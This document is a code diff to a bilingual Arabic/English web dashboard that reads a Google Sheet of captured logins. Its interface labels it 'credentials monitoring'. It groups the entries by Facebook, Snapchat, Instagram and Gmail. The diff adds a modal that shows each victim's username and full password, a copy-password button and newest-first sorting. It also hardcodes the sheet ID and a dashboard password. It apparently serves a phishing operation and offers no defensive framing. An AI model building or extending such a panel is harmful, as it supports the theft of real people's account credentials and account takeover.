@@ -71,6 +71,48 @@
         </div>
     </div>
 
+    <!-- نافذة تفاصيل العملية المنبثقة (Details Modal) -->
+    <div id="detailsModal" class="fixed inset-0 z-50 hidden flex items-center justify-center bg-black/80 backdrop-blur-md p-4">
+        <div id="detailsBox" class="glass-dark p-6 md:p-8 rounded-3xl shadow-2xl w-full max-w-lg border border-white/10 relative">
+            <div class="flex justify-between items-center mb-6 border-b border-white/10 pb-4">
+                <div class="flex items-center gap-3">
+                    <span id="modalPlatformIcon" class="text-3xl">🌐</span>
+                    <div>
+                        <h3 id="modalPlatformTitle" class="text-xl font-bold">تفاصيل العملية</h3>
+                        <p class="text-neutral-400 text-xs">معاينة كاملة للبيانات المسجلة</p>
+                    </div>
+                </div>
+                <button onclick="closeDetailsModal()" class="w-9 h-9 rounded-full glass-btn-dark flex items-center justify-center text-xl cursor-pointer hover:bg-red-500/20 hover:text-red-400 transition">✕</button>
+            </div>
+
+            <div class="space-y-4 text-sm">
+                <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
+                    <span class="text-xs text-neutral-400 block mb-1">التوقيت والتاريخ:</span>
+                    <p id="modalTime" class="font-mono text-neutral-200">-</p>
+                </div>
+                <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
+                    <span class="text-xs text-neutral-400 block mb-1">المنصة:</span>
+                    <p id="modalPlatform" class="font-bold text-blue-400">-</p>
+                </div>
+                <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
+                    <span class="text-xs text-neutral-400 block mb-1">البريد الإلكتروني / اسم المستخدم / الهاتف:</span>
+                    <p id="modalUser" class="font-mono text-emerald-400 text-base select-all">-</p>
+                </div>
+                <div class="bg-white/5 p-4 rounded-2xl border border-white/5">
+                    <span class="text-xs text-neutral-400 block mb-1">كلمة المرور (كاملة):</span>
+                    <div class="flex items-center justify-between mt-1">
+                        <p id="modalPass" class="font-mono text-rose-400 text-lg font-bold select-all tracking-wider">-</p>
+                        <button onclick="copyPassword()" class="px-3 py-1.5 rounded-xl glass-btn-dark text-xs hover:bg-white/10 transition cursor-pointer">📋 نسخ</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mt-6 flex justify-end">
+                <button onclick="closeDetailsModal()" class="px-6 py-2.5 rounded-2xl bg-blue-600 hover:bg-blue-500 text-white font-semibold text-xs transition cursor-pointer shadow-lg">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
     <!-- حاوية الإشعارات العائمة (iOS Toast Container) -->
     <div id="toastContainer" class="fixed top-5 left-1/2 transform -translate-x-1/2 z-40 flex flex-col gap-3 w-full max-w-md px-4 pointer-events-none"></div>
 
@@ -146,7 +188,7 @@
         <div id="tableContainer" class="glass-dark rounded-3xl shadow-2xl overflow-hidden border border-white/5">
             <div class="p-6 border-b border-white/5 flex justify-between items-center">
                 <h3 id="tableTitle" class="text-lg font-bold">سجل البيانات الواردة</h3>
-                <button id="filterBadge" onclick="resetFilter()" class="text-xs px-3 py-1.5 rounded-full glass-btn-dark text-neutral-300 transition cursor-pointer hover:bg-white/10">عرض الكل</button>
+                <button id="filterBadge" onclick="toggleShowAll()" class="text-xs px-3.5 py-1.5 rounded-xl glass-btn-dark text-neutral-300 transition cursor-pointer hover:opacity-80 font-semibold">عرض الكل (الأقدم)</button>
             </div>
             <div class="overflow-x-auto">
                 <table class="w-full text-right border-collapse">
@@ -171,13 +213,13 @@
         const sheetID = '1NwOAl3GdgjUUEK19pEL-v9ZoVEpdQ0NY3Tq7OIMTggI';
         const dashboardPassword = "Zein2112"; // 🔑 كلمة المرور الخاصة باللوحة
         
-        // منع الـ Cache بإضافة متغير وقت عشوائي لرابط الـ CSV
-        const csvUrl = `https://docs.google.com/spreadsheets/d/${sheetID}/gviz/tq?tqx=out:csv&t=${new Date().getTime()}`;
+        const csvUrl = `https://docs.google.com/spreadsheets/d/${sheetID}/gviz/tq?tqx=out:csv`;
 
         let rawRows = [];
         let previousRowCount = 0;
         let isFirstLoad = true;
         let currentFilter = 'all';
+        let showAllRows = false; // التحكم في عرض أول 8 أو الكل
         let currentLang = 'ar';
         let currentTheme = 'dark';
 
@@ -187,7 +229,8 @@
                 subtitle: "تحديث لحظي لبيانات الاعتمادات الواردة",
                 total: "إجمالي العمليات",
                 tableTitle: "سجل البيانات الواردة",
-                allBadge: "عرض الكل",
+                allBadge: "عرض الكل (الأقدم)",
+                lessBadge: "عرض الأحدث فقط",
                 time: "التوقيت",
                 platform: "المنصة",
                 user: "البريد / الهاتف",
@@ -201,7 +244,8 @@
                 subtitle: "Real-time credentials monitoring",
                 total: "Total Records",
                 tableTitle: "Incoming Data Log",
-                allBadge: "Showing All",
+                allBadge: "Show All (Older)",
+                lessBadge: "Show Latest Only",
                 time: "Timestamp",
                 platform: "Platform",
                 user: "Email / Phone",
@@ -232,7 +276,7 @@
             const statusText = document.getElementById('statusText');
 
             try {
-                const response = await fetch(`https://docs.google.com/spreadsheets/d/${sheetID}/gviz/tq?tqx=out:csv&t=${new Date().getTime()}`);
+                const response = await fetch(`${csvUrl}&t=${new Date().getTime()}`);
                 if (!response.ok) throw new Error();
                 const data = await response.text();
                 
@@ -249,7 +293,6 @@
             }
         }
 
-        // محلل ذكي يتعامل مع الفواصل داخل التواريخ والنصوص بشكل صحيح 100%
         function parseCSV(text) {
             const lines = text.split('\n');
             const rows = [];
@@ -329,16 +372,28 @@
             let total = 0, fb = 0, snap = 0, insta = 0, gmail = 0;
             let displayedRows = 0;
 
-            // نبدأ من 1 لتخطي صف العناوين (Headers)
-            for (let i = 1; i < rawRows.length; i++) {
-                let cols = rawRows[i];
+            // عكس ترتيب الصفوف لكي تصبح العمليات الأحدث في الأعلى دائماً
+            let reversedRows = [...rawRows].slice(1).reverse();
+
+            for (let i = 0; i < reversedRows.length; i++) {
+                let cols = reversedRows[i];
                 if (cols && cols.length >= 2) {
                     let time = cols[0] || '';
-                    let platform = cols[1] || '';
-                    
-                    // استخراج اسم المستخدم وكلمة المرور بأمان تام بغض النظر عن عدد الأعمدة
-                    let pass = cols[cols.length - 1] || ''; // العمود الأخير دائماً هو كلمة السر
-                    let user = cols[cols.length - 2] || cols[2] || ''; // العمود قبل الأخير هو اسم المستخدم
+                    let platform = '';
+                    let user = '';
+                    let pass = '';
+
+                    if (cols.length >= 4) {
+                        platform = cols[1];
+                        user = cols[2];
+                        pass = cols[3];
+                    } else if (cols.length === 3) {
+                        platform = cols[1];
+                        pass = cols[2];
+                        user = "N/A";
+                    } else {
+                        continue;
+                    }
 
                     let pLower = platform.toLowerCase();
                     if (pLower.includes('face')) fb++;
@@ -351,6 +406,12 @@
                     }
 
                     total++;
+
+                    // إذا لم يتم تفعيل عرض الكل، نعرض أول 8 عمليات فقط
+                    if (!showAllRows && displayedRows >= 8 && currentFilter === 'all') {
+                        continue;
+                    }
+
                     displayedRows++;
                     let badgeClass = 'bg-black/20 text-neutral-300 border-neutral-800';
                     let icon = '🌐';
@@ -361,7 +422,9 @@
                     else if (pLower.includes('gmail') || pLower.includes('google')) { badgeClass = 'bg-red-500/10 text-red-400 border-red-500/20'; icon = '✉️'; }
 
                     let tr = document.createElement('tr');
-                    tr.className = currentTheme === 'dark' ? 'hover:bg-white/5 transition' : 'hover:bg-black/5 transition';
+                    tr.className = (currentTheme === 'dark' ? 'hover:bg-white/5 transition ' : 'hover:bg-black/5 transition ') + 'cursor-pointer';
+                    tr.onclick = () => openDetailsModal(time, platform, user, pass, icon);
+                    
                     tr.innerHTML = `
                         <td class="p-5 text-neutral-400 text-xs">${time}</td>
                         <td class="p-5"><span class="px-3 py-1.5 rounded-xl text-xs font-semibold border ${badgeClass} inline-flex items-center gap-1.5">${icon} ${platform}</span></td>
@@ -379,19 +442,56 @@
             document.getElementById('gmailCount').innerText = gmail;
 
             if (displayedRows === 0) {
-                tbody.innerHTML = `<tr><td colspan="4" class="p-8 text-center text-neutral-500">لا توجد بيانات مسجلة لهذه المنصة حتى الآن.</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="4" class="p-8 text-center text-neutral-500">لا توجد بيانات مسجلة حتى الآن.</td></tr>`;
             }
+        }
+
+        function toggleShowAll() {
+            showAllRows = !showAllRows;
+            const filterBadge = document.getElementById('filterBadge');
+            
+            if (showAllRows) {
+                filterBadge.innerText = translations[currentLang].lessBadge;
+            } else {
+                filterBadge.innerText = translations[currentLang].allBadge;
+            }
+            renderTable();
+        }
+
+        function openDetailsModal(time, platform, user, pass, icon) {
+            document.getElementById('modalPlatformIcon').innerText = icon;
+            document.getElementById('modalPlatformTitle').innerText = `عملية تسجيل عبر ${platform}`;
+            document.getElementById('modalTime').innerText = time || 'غير متوفر';
+            document.getElementById('modalPlatform').innerText = platform || 'غير متوفر';
+            document.getElementById('modalUser').innerText = user || 'غير متوفر';
+            document.getElementById('modalPass').innerText = pass || 'غير متوفر';
+            
+            const modal = document.getElementById('detailsModal');
+            modal.classList.remove('hidden');
+        }
+
+        function closeDetailsModal() {
+            document.getElementById('detailsModal').classList.add('hidden');
+        }
+
+        function copyPassword() {
+            let passText = document.getElementById('modalPass').innerText;
+            navigator.clipboard.writeText(passText).then(() => {
+                alert('تم نسخ كلمة المرور بنجاح!');
+            });
         }
 
         function filterPlatform(platformName) {
             currentFilter = platformName;
+            showAllRows = true; // عند فلترة منصة معينة، نعرض كل سجلاتها
             const backBtn = document.getElementById('backBtn');
             const filterBadge = document.getElementById('filterBadge');
 
             if (platformName === 'all') {
+                showAllRows = false;
                 backBtn.classList.add('hidden');
                 backBtn.classList.remove('flex');
-                filterBadge.innerText = currentLang === 'ar' ? 'عرض الكل' : 'Showing All';
+                filterBadge.innerText = translations[currentLang].allBadge;
             } else {
                 backBtn.classList.remove('hidden');
                 backBtn.classList.add('flex');
@@ -422,12 +522,15 @@
             document.getElementById('subTitle').innerText = translations[currentLang].subtitle;
             document.getElementById('tableTitle').innerText = translations[currentLang].tableTitle;
             
+            const filterBadge = document.getElementById('filterBadge');
+            if (currentFilter === 'all') {
+                filterBadge.innerText = showAllRows ? translations[currentLang].lessBadge : translations[currentLang].allBadge;
+            }
+
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 let key = el.getAttribute('data-i18n');
                 if (translations[currentLang][key]) el.innerText = translations[currentLang][key];
             });
-
-            filterPlatform(currentFilter);
         }
 
         function toggleTheme() {
@@ -435,22 +538,26 @@
             const bodyBg = document.getElementById('bodyBg');
             const headerCard = document.getElementById('headerCard');
             const tableContainer = document.getElementById('tableContainer');
+            const detailsBox = document.getElementById('detailsBox');
             const themeBtn = document.getElementById('themeBtn');
             const refreshBtn = document.getElementById('refreshBtn');
             const langBtn = document.getElementById('langBtn');
             const backBtn = document.getElementById('backBtn');
+            const filterBadge = document.getElementById('filterBadge');
             const statCards = document.querySelectorAll('.stat-card');
 
             if (currentTheme === 'light') {
                 bodyBg.className = "bg-gray-100 text-gray-900 min-h-screen p-5 md:p-10 relative";
                 headerCard.className = "flex flex-col md:flex-row justify-between items-center mb-8 glass-light p-6 rounded-3xl shadow-xl gap-4";
                 tableContainer.className = "glass-light rounded-3xl shadow-xl overflow-hidden border border-black/5";
+                detailsBox.className = "glass-light p-6 md:p-8 rounded-3xl shadow-2xl w-full max-w-lg border border-black/10 relative";
                 
                 const btnClasses = "px-4 py-2.5 rounded-2xl text-xs font-bold transition cursor-pointer glass-btn-light text-gray-800";
                 refreshBtn.className = "p-2.5 rounded-2xl transition duration-200 cursor-pointer glass-btn-light text-gray-800";
                 langBtn.className = btnClasses;
                 themeBtn.className = "px-4 py-2.5 rounded-2xl text-xs font-bold transition cursor-pointer glass-btn-light text-amber-600";
                 backBtn.className = "hidden items-center gap-2 px-4 py-2.5 rounded-2xl font-semibold transition duration-200 cursor-pointer text-sm glass-btn-light text-gray-800";
+                filterBadge.className = "text-xs px-3.5 py-1.5 rounded-xl glass-btn-light text-gray-700 transition cursor-pointer hover:opacity-80 font-semibold";
                 
                 statCards.forEach(c => c.className = c.className.replace('glass-dark', 'glass-light'));
                 themeBtn.innerHTML = "🌙 Dark";
@@ -458,12 +565,14 @@
                 bodyBg.className = "bg-black text-gray-100 min-h-screen p-5 md:p-10 relative";
                 headerCard.className = "flex flex-col md:flex-row justify-between items-center mb-8 glass-dark p-6 rounded-3xl shadow-2xl gap-4";
                 tableContainer.className = "glass-dark rounded-3xl shadow-2xl overflow-hidden border border-white/5";
+                detailsBox.className, detailsBox.className = "glass-dark p-6 md:p-8 rounded-3xl shadow-2xl w-full max-w-lg border border-white/10 relative";
                 
                 const btnClasses = "px-4 py-2.5 rounded-2xl text-xs font-bold transition cursor-pointer glass-btn-dark text-white";
                 refreshBtn.className = "p-2.5 rounded-2xl transition duration-200 cursor-pointer glass-btn-dark text-white";
                 langBtn.className = btnClasses;
                 themeBtn.className = "px-4 py-2.5 rounded-2xl text-xs font-bold transition cursor-pointer glass-btn-dark text-yellow-400";
                 backBtn.className = "hidden items-center gap-2 px-4 py-2.5 rounded-2xl font-semibold transition duration-200 cursor-pointer text-sm glass-btn-dark text-white";
+                filterBadge.className = "text-xs px-3.5 py-1.5 rounded-xl glass-btn-dark text-neutral-300 transition cursor-pointer hover:opacity-80 font-semibold";
                 
                 statCards.forEach(c => c.className = c.className.replace('glass-light', 'glass-dark'));
                 themeBtn.innerHTML = "☀️ Light";
